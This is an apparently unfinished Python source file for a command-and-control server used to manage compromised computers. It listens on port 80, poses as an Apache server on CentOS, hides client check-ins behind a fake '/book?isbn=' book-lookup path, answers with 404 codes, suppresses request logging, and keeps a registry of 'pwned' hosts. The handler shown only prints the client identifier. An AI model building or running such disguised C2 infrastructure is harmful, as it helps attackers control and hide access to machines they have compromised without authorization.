# Command and Control server code

from http import server
from http.server import BaseHTTPRequestHandler, HTTPServer

from c2_client import client

# Port c2 server listens on
PORT = 80

# Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
BIND_ADDR = ""

# Path to use for signifying a command request form a client using HTTP GET
CMD_REQUEST = "/book?isbn="

class C2Handler(BaseHTTPRequestHandler):
    """This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP requests that arrive at the c2 server."""

    # Make our c2 server look like an up-ti-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # noinspection PyPep8Naming
    def do_GET(self):
        """ This method handles all HTTP GET requests that
        arrive at the c2 server."""

        # These variables must be global as they will often be updated via multiple sessions
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        # Follow this code block when the compromised computer is requesting a command
        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]
            print(client)

        # Sends the HTTP response code and header back to the client
        self.send_response(404)
        self.end_headers()

    def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
        to the screen. Our dosen't log any successfuf connections; it just returns, which is whar we want. """
        return
        # return super().log_request(code, size)()

# This maps to the client that we have a promt for
active_session = 1

# This is the account from the client belonging to the active session
client_account = ""

# This is the hostname from the client belonging to the active session
client_hostname = ""

# Used to uniquely count and track each client connecting in to the c2 server
pwned_id = 0

# Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
pwned_dict = {}

# Instantiate oour HTTPServer object
server = HTTPServer((BIND_ADDR, PORT), C2Handler)

# Run the server in an infinite loop
server.serve_forever()